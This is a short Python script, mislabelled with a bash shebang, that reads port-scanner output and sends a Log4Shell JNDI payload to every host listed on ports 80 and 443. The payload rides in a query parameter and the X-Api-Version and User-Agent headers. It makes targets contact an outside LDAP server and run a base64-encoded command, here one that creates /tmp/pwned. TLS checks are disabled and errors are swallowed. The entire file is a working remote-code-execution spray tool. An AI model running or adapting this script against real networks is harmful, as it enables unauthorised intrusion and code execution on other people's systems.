#! /bin/bash

import os
import requests
import sys

file = open(sys.argv[1], 'r')
datas = file.read().splitlines()

#Discovered open port 80/tcp on 192.168.1.82
#Discovered open port 443/tcp on 192.168.11.98
for data in datas:
    data=data.split()
    print (data)
    if data[3]=="80/tcp":
        uri=data[5]
        uri='http://{DOMIN}/'.format(DOMIN=uri)
        payload= '${jndi:ldap://172.30.200.130:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
        try:
            response = requests.get(
                uri,
                timeout=2,
                params={'q': payload},
                headers={ 'content-type': 'application/json' ,'X-Api-Version': payload , 'User-Agent' : payload },
            ) 
        except: 
            pass
    else:
        uri=data[5]
        uri='https://{DOMIN}/'.format(DOMIN=uri)
        payload= '${jndi:ldap://172.30.200.130:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
        try:
            response = requests.get(
                uri,
                verify=False,
                timeout=2,
                params={'q': payload},
                headers={ 'content-type': 'application/json' ,'X-Api-Version': payload , 'User-Agent' : payload },
            ) 
        except: 
            pass